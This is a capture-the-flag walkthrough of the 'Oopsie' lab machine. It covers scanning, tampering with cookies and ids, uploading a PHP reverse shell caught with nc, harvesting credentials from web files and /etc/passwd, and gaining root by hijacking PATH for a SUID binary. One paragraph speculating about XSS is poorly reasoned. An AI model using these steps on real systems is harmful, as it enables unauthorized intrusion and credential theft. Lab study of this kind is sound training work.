# Oopsie
#startingpoint 
#veryeasy 
#web 
#privescalation 
#latmovement
#cookie
#suid
#php 

### Reconnaissance
The first step in any penetration test is reconnaissance, where we gather information about the target application and its environment. In this case, we used `nmap -p-  $TARGET` to scan the target IP address and identify open ports and services. The output of the Nmap scan is shown below:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-21 18:17 CET
Nmap scan report for 10.129.104.19
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
From the Nmap output, we can see that the target application is running SSH and HTTP services. We also note that there are 65533 closed TCP ports, which suggests that the target application may have additional services or applications running on those ports that are not visible to us.
### Web Application Analysis

Next, we analyzed the target web application using Burp Suite as a proxy to identify potential vulnerabilities. Even if at first sight the website seems pretty simple, in Burp Suite the sitemap allow us to see that there is a hidden login.

We checked the login that is `/cdn-cgi/login` by accessing `http://10.129.104.19/cdn-cgi/login`.
The login had let us enter as a guest, so we did it to perform a further exploration.

The website have a page for uploading files that we could exploit but we needed superadmin rights to use it, so we checked the cookies finding there a cookie for the role and another one for the user id. As we didn't have the values for the admin cookies we keep searching in the website, this time we find a account info tab that shows us the user id, role and mail. The url of this last tab looks like `http://10.129.104.19/cdn-cgi/login/admin.php?content=accounts&id=2`, so we can try to modify the value of id to 1.

|34322|admin|admin@megacorp.com|

With the new value we get the values we needed to modify the cookies in order to be superadmin. With the superadmin priviledges we uploaded a reverse shell to the website, the one that was used can be found in ParrotOS /usr/share/webshells/php/php-reverse-shell.php`

Once uploaded we need to know how to access it so we can trigger it, to achieve this we perform a enumeration of directories with `gobuster dir -u $TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html`

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.104.19
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2023/11/21 18:44:37 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.104.19/images/]
/index.php            (Status: 200) [Size: 10932]                                 
/themes               (Status: 301) [Size: 315] [--> http://10.129.104.19/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.104.19/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.104.19/css/]    
/js                   (Status: 301) [Size: 311] [--> http://10.129.104.19/js/]     
/fonts                (Status: 301) [Size: 314] [--> http://10.129.104.19/fonts/]
```

It will possibly be inside the /uploads directory so before triggering it we start the listener with `nc -lvnp 1234`, now to trigger it we just need to enter into the /uploads/php-reverse-shellp.php. As we get a basic shell we can improve it with `python3 -c 'import pty;pty.spawn("/bin/bash")'`

From the Burp Suite output, we can see that the target application is using a session ID in a cookie. We also note that the login form accepts both username and password input fields. Based on this information, we can infer that the target application may be vulnerable to a cross-site scripting (XSS) attack.

### Lateral movement

As we are using the user www-data which doesn't have privileges, we want to perform a escalation or a lateral movement.
To do so, we start by getting all the available information we can with this user. As the www-data we have permissions on the webcontents files/folders so we go to the default folder for web contents `/var/www/html/` then also we go inside the login folder `/cdn-cgi/login` and inside we perform a search of any kind of password `cat * | grep -i passw*`

```
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```
Now we have a password but we don't know the username so we check the contents of  /etc/passwd.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
The user robert is a real one(we know it because of the assigned shell), so we try to login into its account with the password we discovered previously. When testing with `su` we realize that the password isnt the one of robert so we keep looking. Now we check the file `db.php` getting

```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```
We test again to login into robert account with the new password and this time we achieve it.

### Privilege escalation
With our brand new account we start checking if we are a sudoer and our ids by running `sudo -l` and `id`

```
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
```
We are not sudoers

```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

But we are in a special group, so lets check if there are any special binaries by running `find / -group bugtracker 2>/dev/null`

```
/usr/bin/bugtracker
```

The special group has a file, so we check the special file type and permissions with the command  `ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker`
```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

The file has the euid enabled so we can exploit it to escalate privileges, now we run the app to test what it does, apparently it cats a file of our election.

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory
```

A rootcheck  can be performed  if we change the cat exec, to do this we create a fake cat in `/tmp` that calls `/bin/sh`, now we modify our path with the following commands `echo '/bin/sh' > /tmp/cat`  `chmod +x /tmp/cat` `export PATH=/tmp:$PATH`
After running all the commands we test again to run bugtracker, this time it gave us a root terminal.

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

# whoami
whoami
root
```